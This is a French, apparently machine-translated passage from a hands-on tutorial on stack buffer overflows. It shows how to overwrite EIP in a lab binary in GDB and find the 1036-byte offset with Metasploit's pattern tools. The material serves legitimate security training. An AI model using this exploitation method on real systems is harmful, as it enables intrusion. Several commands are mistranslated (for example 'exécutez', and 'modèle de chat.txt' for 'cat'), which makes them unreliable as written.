Prenez le contrôle de l'EIP
===================

* * * * *

L'un des aspects les plus importants d'un débordement de tampon basé sur la pile est de contrôler le `pointeur d'instruction` (`EIP`), afin que nous puissions lui dire à quelle adresse il doit sauter. Cela fera pointer `EIP` vers l'adresse où notre `shellcode` démarre et obligera le processeur à l'exécuter.

Nous pouvons exécuter des commandes dans GDB en utilisant Python, qui nous sert directement d'entrée.

#### Défaut de segmentation

Défaut de segmentation

```
étudiant@nix-bow :~$ gdb -q bow32

(gdb) exécutez $(python -c "print '\x55' * 1200")
Programme de démarrage : /home/student/bow/bow32 $(python -c "print '\x55' * 1200")

Le programme a reçu le signal SIGSEGV, Défaut de segmentation.
0x55555555 dans ?? ()

```

Si nous insérons 1200 "`U`" (hex "`55`") en entrée, nous pouvons voir à partir des informations de registre que nous avons écrasé le `EIP`. Pour autant que nous le sachions, `EIP` pointe vers la prochaine instruction à exécuter.

Défaut de segmentation

```
(gdb) registres d'informations

eax 0x1 1
ECX 0xffffd6c0 -10560
edx 0xffffd06f -12177
ebx 0x55555555 1431655765
esp 0xffffcfd0 0xffffcfd0
ebp 0x55555555 0x55555555 # <---- EBP écrasé
esi 0xf7fb5000 -134524928
edi 0x0 0
eip 0x55555555 0x55555555 # <---- EIP écrasé
eflags 0x10286 [ PF SF IF RF ]
cs 0x23 35
param 0x2b 43
ds 0x2b 43
es 0x2b 43
fs 0x0 0
gs 0x63 99

```

Si nous voulons imaginer le processus visuellement, alors le processus ressemble à ceci.

#### Amortir

![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_2.png)

Cela signifie que nous devons accéder en écriture à l'EIP. Ceci, à son tour, permet de spécifier à quelle adresse mémoire l'EIP doit sauter. Cependant, pour manipuler le registre, nous avons besoin d'un nombre exact d'U jusqu'à l'EIP afin que les 4 octets suivants puissent être écrasés par l'adresse mémoire souhaitée.

* * * * *

Déterminer le décalage
--------------------

Le décalage est utilisé pour déterminer combien d'octets sont nécessaires pour écraser le tampon et combien d'espace nous avons autour de notre shellcode.

Shellcode est un code de programme qui contient des instructions pour une opération que nous voulons que le CPU exécute. La création manuelle du shellcode sera abordée plus en détail dans d'autres modules. Mais pour gagner du temps d'abord, nous utilisons le Metasploit Framework (MSF) qui propose un script Ruby appelé "pattern_create" qui peut nous aider à déterminer le nombre exact d'octets pour atteindre l'EIP. Il crée une chaîne unique basée sur la longueur d'octets que vous spécifiez pour aider à déterminer le décalage.

#### Créer un motif

Créer un motif

```
dsgsec@htb[/htb]$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt
dsgsec@htb[/htb]$ modèle de chat.txt

Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9

```

Maintenant, nous remplaçons nos 1200 "`U`" par les modèles générés et concentrons à nouveau notre attention sur l'EIP.

#### GDB - Utilisation du modèle généré

GDB - Utilisation du modèle généré

```
(gdb) exécuter $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'")

Le programme en cours de débogage a déjà été démarré.
Commencer depuis le début ? (o ou n) o

Programme de démarrage : /home/student/bow/bow32 $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'")
Le programme a reçu le signal SIGSEGV, Défaut de segmentation.
0x69423569 dans ?? ()

```

#### GDB - EIP

GDB-EIP

```
(gdb) registres d'informations eip

eip 0x69423569 0x69423569

```

Nous voyons que `EIP` affiche une adresse mémoire différente, et nous pouvons utiliser un autre outil MSF appelé "`pattern_offset`" pour calculer le nombre exact de caractères (décalage) nécessaires pour passer à `EIP`.

#### GDB - Décalage

GDB - Décalage

```
dsgsec@htb[/htb]$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569

[*] Correspondance exacte au décalage 1036

```

#### Amortir

![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_3.png)

Si nous utilisons maintenant précisément ce nombre d'octets pour nos "`U`", nous devrions atterrir exactement sur `EIP`. Pour l'écraser et vérifier si nous l'avons atteint comme prévu, nous pouvons ajouter 4 octets supplémentaires avec "`\x66`" et l'exécuter pour nous assurer que nous contrôlons le `EIP`.

#### Décalage GDB

Décalage GDB

```
(gdb) exécutez $(python -c "print '\x55' * 1036 + '\x66' * 4")

Le programme en cours de débogage a déjà été lancé.
Commencer depuis le début ? (o ou n) o

Programme de démarrage : /home/student/bow/bow32 $(python -c "print '\x55' * 1036 + '\x66' * 4")
Le programme a reçu le signal SIGSEGV, Défaut de segmentation.
0x66666666 en ?? ()

```

#### Amortir

![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_4.png)

Nous voyons maintenant que nous avons remplacé `EIP` par nos caractères "`\x66`". Ensuite, nous devons découvrir combien d'espace nous avons pour notre shellcode, qui exécute ensuite les commandes que nous avons l'intention. Comme nous contrôlons maintenant `EIP` , nous l'écraserons plus tard avec l'adresse pointant vers le début de notre shellcode.